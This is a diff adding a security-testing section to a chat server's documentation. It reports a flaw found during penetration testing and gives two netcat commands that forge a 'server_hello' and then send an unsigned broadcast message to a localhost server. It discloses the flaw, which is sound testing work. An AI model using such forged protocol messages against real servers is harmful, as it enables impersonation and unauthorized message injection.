@@ -63,3 +63,19 @@ I HAVE RECEIVED A REQUEST FROM A CLIENT FOR A LIST
 ```
 
 ### Security Testing
+
+During penetration testing, we discovered a critical access control vulnerability using Netcat. By sending a `server_hello` message directly to the server, we set the `is_server` flag to `True` for our session. The messages sent were:
+
+1. **Setting `is_server` to `True`:**
+
+   ```bash
+   echo '{"type":"server_hello","sender":"127.0.0.1:12347"}' | nc 127.0.0.1 12345
+   ```
+
+2. **Sending an unsigned `public_chat` message:**
+
+   ```bash
+   echo '{"type":"signed_data","data":{"type":"public_chat","sender":"malicious_client","message":"This is an unsigned message"},"counter":1,"signature":""}' | nc 127.0.0.1 12345
+   ```
+
+The server accepted and broadcasted the unsigned message to other clients without verifying the signature, even when no client application was open. This demonstrates a significant vulnerability where a malicious actor can impersonate a server and send unauthorized messages. 
